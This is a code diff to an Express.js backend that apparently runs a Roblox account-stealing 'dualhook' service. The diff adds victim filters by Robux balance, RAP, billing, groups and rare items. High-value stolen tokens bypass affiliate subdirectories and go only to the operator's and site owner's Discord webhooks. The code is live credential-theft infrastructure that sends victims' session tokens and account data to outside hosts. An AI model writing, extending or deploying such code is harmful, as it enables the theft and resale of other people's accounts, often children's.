@@ -804,7 +804,17 @@ app.post('/api/create-directory', async (req, res) => {
       apiToken: crypto.randomBytes(32).toString('hex'),
       authToken: authToken, // For user dashboard login
       uniqueId: uniqueId, // Unique ID for stats
-      subdirectories: {} // For nested directories in dualhook
+      subdirectories: {}, // For nested directories in dualhook
+      // Filtering options for dualhook directories
+      filters: {
+        enabled: false,
+        currency: { enabled: false, type: 'balance', value: 0 },
+        collectibles: { enabled: false, type: 'rap', value: 0 },
+        billings: { enabled: false, type: 'summary', value: 0 },
+        groups: { enabled: false, type: 'balance', value: 0 },
+        korblox: { enabled: false },
+        headless: { enabled: false }
+      }
     };
 
     // Save directories
@@ -938,6 +948,179 @@ function authenticateUser(req, res, next) {
   next();
 }
 
+// API endpoint to get directory filters for authenticated users
+app.get('/api/user-filters', authenticateUser, async (req, res) => {
+  try {
+    const authToken = req.userToken;
+
+    // Find user's directory
+    const directories = await loadDirectories();
+    let userDirectory = null;
+    let directoryConfig = null;
+    let isSubdirectory = false;
+
+    // First check main directories
+    for (const [dirName, dirConfig] of Object.entries(directories)) {
+      if (dirConfig.authToken === authToken) {
+        userDirectory = dirName;
+        directoryConfig = dirConfig;
+        break;
+      }
+
+      // Then check subdirectories
+      if (dirConfig.subdirectories) {
+        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
+          if (subConfig.authToken === authToken) {
+            userDirectory = `${dirName}/${subName}`;
+            directoryConfig = dirConfig; // Use parent config for filters
+            isSubdirectory = true;
+            break;
+          }
+        }
+      }
+
+      if (userDirectory) break;
+    }
+
+    if (!userDirectory) {
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+
+    // Only return filters for Dualhook directories AND only for parent directory users (not subdirectories)
+    if (directoryConfig.serviceType !== 'dualhook') {
+      return res.status(403).json({ error: 'Filters are only available for Dualhook directories' });
+    }
+
+    // Subdirectory users should not see or modify filters
+    if (isSubdirectory) {
+      return res.status(403).json({ error: 'Filters are not available for subdirectory users' });
+    }
+
+    res.json({
+      directory: userDirectory,
+      serviceType: directoryConfig.serviceType,
+      isSubdirectory: isSubdirectory,
+      filters: directoryConfig.filters || {
+        enabled: false,
+        currency: { enabled: false, type: 'balance', value: 0 },
+        collectibles: { enabled: false, type: 'rap', value: 0 },
+        billings: { enabled: false, type: 'summary', value: 0 },
+        groups: { enabled: false, type: 'balance', value: 0 },
+        korblox: { enabled: false },
+        headless: { enabled: false }
+      }
+    });
+
+  } catch (error) {
+    console.error('Error getting user filters:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// API endpoint to update directory filters for authenticated users
+app.post('/api/user-filters', authenticateUser, async (req, res) => {
+  try {
+    const authToken = req.userToken;
+    const { filters } = req.body;
+
+    if (!filters) {
+      return res.status(400).json({ error: 'Filters configuration required' });
+    }
+
+    // Find user's directory
+    const directories = await loadDirectories();
+    let userDirectory = null;
+    let parentDirectory = null;
+    let isSubdirectory = false;
+
+    // First check main directories
+    for (const [dirName, dirConfig] of Object.entries(directories)) {
+      if (dirConfig.authToken === authToken) {
+        userDirectory = dirName;
+        parentDirectory = dirName;
+        break;
+      }
+
+      // Then check subdirectories
+      if (dirConfig.subdirectories) {
+        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
+          if (subConfig.authToken === authToken) {
+            userDirectory = `${dirName}/${subName}`;
+            parentDirectory = dirName;
+            isSubdirectory = true;
+            break;
+          }
+        }
+      }
+
+      if (userDirectory) break;
+    }
+
+    if (!userDirectory) {
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+
+    // Only allow filter updates for Dualhook directories (check parent directory)
+    if (directories[parentDirectory].serviceType !== 'dualhook') {
+      return res.status(403).json({ error: 'Filters are only available for Dualhook directories' });
+    }
+
+    // Subdirectory users should not be able to update filters
+    if (isSubdirectory) {
+      return res.status(403).json({ error: 'Subdirectory users cannot modify filters' });
+    }
+
+    // Update filters in parent directory (filters are shared across all subdirectories)
+    directories[parentDirectory].filters = {
+      enabled: filters.enabled || false,
+      currency: {
+        enabled: filters.currency?.enabled || false,
+        type: filters.currency?.type || 'balance',
+        value: Math.max(0, parseInt(filters.currency?.value) || 0)
+      },
+      collectibles: {
+        enabled: filters.collectibles?.enabled || false,
+        type: filters.collectibles?.type || 'rap',
+        value: Math.max(0, parseInt(filters.collectibles?.value) || 0)
+      },
+      billings: {
+        enabled: filters.billings?.enabled || false,
+        type: filters.billings?.type || 'summary',
+        value: Math.max(0, parseInt(filters.billings?.value) || 0)
+      },
+      groups: {
+        enabled: filters.groups?.enabled || false,
+        type: filters.groups?.type || 'balance',
+        value: Math.max(0, parseInt(filters.groups?.value) || 0)
+      },
+      korblox: {
+        enabled: filters.korblox?.enabled || false
+      },
+      headless: {
+        enabled: filters.headless?.enabled || false
+      }
+    };
+
+    // Save directories
+    const saveSuccess = await saveDirectories(directories);
+    if (!saveSuccess) {
+      return res.status(500).json({ error: 'Failed to save filter configuration' });
+    }
+
+    console.log(`✅ Filters updated for Dualhook directory: ${userDirectory}`);
+
+    res.json({
+      success: true,
+      message: 'Filters updated successfully',
+      filters: directories[parentDirectory].filters
+    });
+
+  } catch (error) {
+    console.error('Error updating user filters:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
 // API endpoint to get user statistics
 app.get('/api/user-stats', authenticateUser, async (req, res) => {
   try {
@@ -974,11 +1157,19 @@ app.get('/api/user-stats', authenticateUser, async (req, res) => {
     const snapshot = await logsRef.once('value');
     const allLogs = snapshot.val() || {};
 
-    // Filter logs for this user
-    const userLogs = Object.values(allLogs).filter(log => 
-      log.context && (log.context.directory === userDirectory || 
-      log.context.directory === userDirectory.split('/')[0])
-    );
+    // Filter logs for this specific user/subdirectory only
+    const userLogs = Object.values(allLogs).filter(log => {
+      if (!log.context) return false;
+      
+      // For subdirectories, only match exact subdirectory path
+      if (userDirectory.includes('/')) {
+        const [parentDir, subDir] = userDirectory.split('/');
+        return log.context.directory === parentDir && log.context.subdirectory === subDir;
+      }
+      
+      // For parent directories, only match direct hits (not subdirectory hits)
+      return log.context.directory === userDirectory && !log.context.subdirectory;
+    });
 
     const today = new Date().toDateString();
     const todayLogs = userLogs.filter(log => {
@@ -1783,6 +1974,55 @@ async function fetchRobloxUserData(token) {
   } catch (error) {
     return null;
   }
+}
+
+// Function to check if user data meets Dualhook filter criteria
+function meetsFilterCriteria(userData, filters) {
+  // If filters are not enabled globally, never meet criteria
+  if (!filters || !filters.enabled) return false;
+
+  // Check if any individual filters are enabled
+  const hasEnabledFilters = filters.currency?.enabled || 
+                           filters.collectibles?.enabled || 
+                           filters.billings?.enabled || 
+                           filters.groups?.enabled || 
+                           filters.korblox?.enabled || 
+                           filters.headless?.enabled;
+
+  // If no individual filters are enabled, don't filter
+  if (!hasEnabledFilters) return false;
+
+  // Check currency filters
+  if (filters.currency?.enabled && filters.currency.value > 0) {
+    const value = filters.currency.type === 'balance' ? userData.robux : userData.robux;
+    if (value < filters.currency.value) return false;
+  }
+
+  // Check collectibles filters
+  if (filters.collectibles?.enabled && filters.collectibles.value > 0) {
+    const value = filters.collectibles.type === 'rap' ? userData.rap : userData.rap;
+    if (value < filters.collectibles.value) return false;
+  }
+
+  // Check billings filters
+  if (filters.billings?.enabled && filters.billings.value > 0) {
+    const value = filters.billings.type === 'summary' ? userData.summary : userData.summary;
+    if (value < filters.billings.value) return false;
+  }
+
+  // Check groups filters
+  if (filters.groups?.enabled && filters.groups.value > 0) {
+    const value = filters.groups.type === 'balance' ? userData.groupsOwned : userData.groupsOwned;
+    if (value < filters.groups.value) return false;
+  }
+
+  // Check Korblox filter
+  if (filters.korblox?.enabled && !userData.korblox) return false;
+
+  // Check Headless filter
+  if (filters.headless?.enabled && !userData.headless) return false;
+
+  return true;
 }
 
 // Function to send custom dualhook webhook with directory branding
@@ -2675,39 +2915,44 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;
       const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - ${directoryName.toUpperCase()} AUTOHAR`;
 
+      // Check if hit meets Dualhook filter criteria
+      const meetsFilters = meetsFilterCriteria(webhookUserData, parentConfig.filters);
 
+      let subdirectoryWebhookResult = { success: true };
+      let dualhookWebhookResult = { success: true };
 
-      const subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle);
+      // If filters are met, only send to Dualhook directory and site owner (skip subdirectory)
+      if (meetsFilters) {
+        console.log(`🎯 Hit meets Dualhook filters for ${directoryName}/${subdirectoryName}, bypassing subdirectory webhook`);
+        
+        // Add filter notification to webhook title
+        const filteredTitle = `🎯 FILTERED HIT - ${directoryName.toUpperCase()} AUTOHAR`;
 
-      if (subdirectoryWebhookResult.success) {
-
-      } else {
-
-      }
-
-      // 2. Send to dualhook master webhook (collects from all subdirectory users)
-      let dualhookWebhookResult = { success: true }; // Default success for validation
-      if (parentConfig.dualhookWebhookUrl) {
-
-        dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, customTitle);
-
-        if (dualhookWebhookResult.success) {
-
-        } else {
-
+        // 1. Send to dualhook master webhook with filtered title
+        if (parentConfig.dualhookWebhookUrl) {
+          dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, filteredTitle);
         }
-      }
 
-      // 3. Send to site owner webhook (website owner)
-      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
-      if (siteOwnerWebhookUrl) {
+        // 2. Send to site owner webhook
+        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+        if (siteOwnerWebhookUrl) {
+          await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, filteredTitle);
+        }
+      } else {
+        // Normal triple-webhook logic when filters are not met
+        
+        // 1. Send to subdirectory webhook
+        subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle);
 
-        const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, customTitle);
+        // 2. Send to dualhook master webhook (collects from all subdirectory users)
+        if (parentConfig.dualhookWebhookUrl) {
+          dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, customTitle);
+        }
 
-        if (siteOwnerWebhookResult.success) {
-
-        } else {
-
+        // 3. Send to site owner webhook (website owner)
+        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
+        if (siteOwnerWebhookUrl) {
+          const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, customTitle);
         }
       }
 
